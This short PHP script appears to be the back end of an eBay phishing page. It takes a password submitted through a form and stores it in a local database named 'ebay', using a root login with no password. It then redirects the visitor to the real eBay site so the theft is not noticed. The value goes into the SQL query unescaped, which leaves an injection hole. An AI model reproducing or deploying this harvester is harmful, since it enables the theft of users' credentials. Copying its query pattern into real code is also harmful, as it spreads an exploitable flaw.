<?php

if(isset($_POST['submiit']))
{
    $connection = mysqli_connect("localhost" , "root" , "" , "ebay") ; 

    

    $password = $_POST['Password'];
   

        
            $query = "INSERT INTO clientt
            VALUES ('$password')";
            $query_run = mysqli_query($connection, $query);
    
           
       header('Location: https://www.ebay.com/');
         
}
?>